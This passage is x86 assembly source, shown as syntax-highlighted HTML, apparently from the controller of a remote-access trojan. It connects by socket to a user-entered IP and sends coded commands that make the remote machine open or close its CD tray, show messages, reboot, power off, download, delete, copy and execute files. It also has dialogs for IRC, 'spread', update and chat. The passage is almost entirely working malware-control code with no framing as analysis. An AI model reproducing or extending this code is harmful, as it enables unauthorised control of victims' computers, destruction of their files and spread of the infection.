    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EM_REPLACESEL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IDD_TAB</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">TRUE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">connect_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">  
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheIP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_IP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheIP</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inet_addr</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">sin.sin_addr</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">16</span><span class="sc0">      
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sin</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">sockhandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">connect</span><span class="sc0">

    </span><span class="sc1">;test   eax,eax</span><span class="sc0">
    </span><span class="sc1">;jne    notc_1</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">notc_1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">error_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">EM_REPLACESEL</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">IDD_TAB</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SendDlgItemMessageA</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">



</span><span class="sc5">IRC_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">irc_d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">irc_dialog</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">


</span><span class="sc5">spread_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spread_d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">spread_dialog</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">update_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">update_d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">update_dialog</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">chat_</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">L</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chat_d</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chat_dialog</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hInst</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">opencd_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">open_cd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">closecd_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">close_cd</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">msgbox_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'621!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd_loop</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    
</span><span class="sc5">cmd2_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd2_loop</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">


    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">reboot_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reboot_system</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">poweroff_</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">power_off</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">download_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'221!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd_loop1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd_loop1</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc12">','</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_2</span><span class="sc0">
    
</span><span class="sc5">cmd2_loop2</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd2_loop2</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">deletef_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'311!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd_loop3</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd_loop3</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">execute_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc12">'911!'</span><span class="sc0"> 
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">

</span><span class="sc5">cmd_loop4</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cmd_loop4</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">data_</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">send_c</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">FALSE</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Dialog_end</span><span class="sc0">

</span><span class="sc5">copyf_</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">256</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cmd_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">ID_CMD_1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">hwnd</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDlgItemTextA</span><span class="sc0"> 

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

